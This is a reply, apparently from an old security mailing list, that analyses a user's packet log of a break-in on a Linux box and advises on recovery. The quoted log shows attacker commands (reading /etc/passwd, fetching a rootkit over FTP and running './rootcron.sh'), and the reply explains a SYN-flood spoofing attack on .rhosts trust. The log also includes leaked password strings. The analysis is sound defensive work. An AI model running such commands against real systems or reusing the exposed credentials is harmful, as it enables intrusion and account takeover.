 &gt; This doesn't sound like such a good idea to me.
 
It isn't.  What you saw was someone who had alredy broken into your
machine attempt to exploit bugs on other systems.  Funnily enough, the
bugs they attempted to exploit were in IMAP (port 143) and (ta-da!) rsh
(port 514).

In other words, they were trying to exploit .rhosts trust relationships.
I'd strongly suggest checking your other boxes for rootkits.

 &gt; The Polish user then types "FOLD" followed by a large number
 &gt; of copies of the byte 0x90.
 &gt; The packet length is 1044 bytes.
 &gt; An overflow attack, I think.
 &gt; ============================
 &gt; Then rat sends the text:
 &gt; 2:49 a.m. up 25 days,  1:42....
 
Sounds like they'd been probing for .rhosts trust relationships by attempting
to run the "uptime" command on remote machines, and in this particular case
they've hit paydirt.

That's certainly the first thing I'd do if I'd broken into something and 
wanted to widen the scope of the damage I was causing.

Note, incidentally, this probably means they've successfully logged in
to one of your systems -- Either to rat as another user, or to one of
the other Linux boxes you have at home.  The rest of your transcript could
conceivably have come from one of those boxes, across an rsh session to rat,
but you won't have monitored that very much because you'd probably made the
assumption that rsh traffic is 'internal' and not worth extensively sniffing.
(this is an assumption on my part which could be wrong;  either way, though,
it sounds like they've widened the scope of the initial vulnerability by
using rsh).

Rather topical, eh? :-)

 &gt; ============================
 &gt; Then the Polish user types:
 &gt; cat /etc/passwd
 &gt; And "rat" reponds with the contents of /etc/passwd.
 
Hope you're using different passwords on all your systems.

 &gt; ============================
 &gt; Polish user types
 &gt; cd /tmp
 &gt; ftp ftp.technotronic.com
 
ftp's to a server somewhere to get a rootkit.
 
 &gt; ============================
 &gt; The the Polish user types "hash" to my "pop2" client.

To your pop2 *port*.  It seems reasonably clear that they've been able to 
exploit a buffer overflow to make your POP2 server exec a shell.

 &gt; Then there's a 212-byte packet which starts:
 &gt; Name (ftp.technotronic.com:n...
 &gt; Probably it's:
 &gt; Name (ftp.technotronic.com:nobody...
 &gt; Question:
 &gt; Does anyone know if this executes a script?
 &gt; E.g. the rootcron.sh file?
 
Try ftp'ing to ftp.technotronic.com, Alan.  You'll see that the login 
prompt looks like this:

<A HREF="mailto:newton@atdot">newton@atdot</A>&gt; ftp ftp.technotronic.com.
Connected to ftp.technotronic.com.
220-ftp.technotronic.com FTP server (NcFTPd 2.2.2) ready.
220-Welcome, to the Technotronic Full Disclosure Security Information
220-ftp archive! Information and programs are supplied "as-is" without
220-warranty of any kind. Technotronic shall not be liable for any direct
220-or indirect damages caused by the use / misuse of the information
220-available within this archive.
220
Name (ftp.technotronic.com:newton):

So that's indicating that they had actually managed to break into your
system as user "nobody".  If your POP2 server (which probably shouldn't
have been running in the first place) doesn't run with the privileges of
the "nobody" user, then that isn't the way they actually got in.

 &gt; ============================
 &gt; Then the Polish user types:
 &gt; ftp.technotronic.com
 &gt; Then rat opens an FTP connection to sword.damocles.com.
 &gt; The machine responds:
 
You don't think, perhaps, that your logs are out of sync?

 &gt; 220-sword.damocles.com.FTP.ser....
 &gt; sword.damocles.com responds that it is disconnecting.
 &gt; ============================
 &gt; Then the Polish user types:
 &gt; ankdsfnkjdsfjkljkl
 &gt; "rat" relays this to sword.damocles.com:
 &gt; USER ankdsfnkjdsfjkljkl
 &gt; "rat" reponds to the Polish user on the pop2 connection:
 &gt; Name: (technotronic.com:nobody....
 
I suspect you've been missing packets around here somewhere.

 &gt; Then rat opens a new connection to the imap2 port of migux.
 &gt; There is this response from migux.mig.be at 03:11:32:
 &gt; * OK migux.mig.be IMAP4rev1
 &gt; "rat" responds with:
 &gt; 00000000 CAPABILITY
 &gt; "migux" sends:
 &gt; * CAPABILITY IMAP4 IMAP4REV1
 &gt; "rat" sends:
 &gt; 00000001 AUTHENTICATE LOGIN
 &gt; "migux" sends:
 &gt; +.VXNlciBOYW1lAA==
 &gt; This looks to me like a password challenge?

Yes, he's loging into the imap server on migux.mig.be.  I hope you obtained
permission from that system's admin before broadcasting username/password
details from that machine to a mailing list of 600 people.

 &gt; Why does a pop2 session allow the user to open FTP connections?
 &gt; Is this normal?
 
Search the web for "buffer overflow".  They've compromised the pop2 daemon,
causing it to exec() a shell.  Either that or the initial breakin was at
some point in the past, and they installed a telnet server on port 109 at
that stage which they're now coming back to exploit.

 &gt; ./rootcron.sh

Rootkit has now been installed;  You can bet your ass that from this point
onwards they can login as root whenever they feel like it, your passwords
will be monitored when you login, etc.

 &gt; Exactly the same sequence follows as above.
 &gt; But then the Polish user types:
 &gt; whoami
 &gt; and "rat" responds:
 &gt; root
 
Yeah, root exploits are kinda like that.

 &gt; =================================
 &gt; Then the Polish user sends lots of telnet SYN packets!
 &gt; And then a SYN packet to port 7000.
 &gt; (This was added to the inetd.conf file, remember!)
 &gt; But the 7000 port connection is refused: RST/ACK.
 
They're trying to overwhelm another system as a preparation for another
.rhosts attack.  Basically, once you've worked out that a particular IP
address is "trusted" by another machine, you bombard the trusted IP with
SYN packets to overwhelm it and get it off the net for a few seconds, then
you forge packets under its IP address to the "victim".  The victim will 
send acknowledgements to the real "trusted" machine, but it won't TCP RST
them because it's too busy dealing with the SYN flood.

That's probably what's happening at each point where you've seen the FOLD 0x90
sequence.

 &gt; Then host 216.167.96.108 opens a connection to rat's "auth" port.
 &gt; It then sends:
 &gt; 5940, 21
 &gt; Coincidentally, 5940 is the port that rat used to call the
 &gt; 216.167.96.108 port 21 with.
 &gt; "rat" responds with:
 &gt; 5940 , 21 : USERID : OTHER : ....
 
That's how the "auth" protocol works.  As you can see, the results are less
than entirely reliable :-)

 &gt; ===================================
 &gt; The Polish user then sends:
 &gt; RWknnUhqW
 
You're sending another password to a public mailing list.  I'd suggest 
getting in touch with 216.167.96.108 and telling them that their security
is broken.

 &gt; I think that Mark Newton was right.
 &gt; The .rhosts thing is very bad.
 &gt; These hackers could have broken into all of my computers
 &gt; from one computer.

It goes further than that -- I'm left wondering if the reason you were 
targetted for these particular exploits is because of the public discussion
of your security measures, where it was made fairly clear that you were
using .rhosts for authentication.

Strong suggestion:  Check your other systems.  (also, change all your
passwords; you've probably worked that out, though :-)

You might also want to regenerate your ssh host keys and private keypairs;
They accessed a system as root -- if they've stolen a private key, they can
use that to pretend to be you in an ssh attack (which is why they key is 
supposed to be private).  The moral of that story is that once someone has
compromised a system as root, you've lost the whole game.

Finally, packet logs notwithstanding, you have no real idea about what they've
done to your system.  I'd strongly suggest reinstalling rat (with a more 
recent version of the OS; make sure it isn't a revision which includes the
security hole in the wu-ftpd :-)  You're going to have a busy couple of 
days...

 &gt; Trouble is, though, that "ssh" lets root read the sh password
 &gt; in clear from a unix port.

Eh?  What are you talking about?  ssh doesn't transmit any passwords in the
clear!

Anyway, good luck with tightening things up,

   - mark
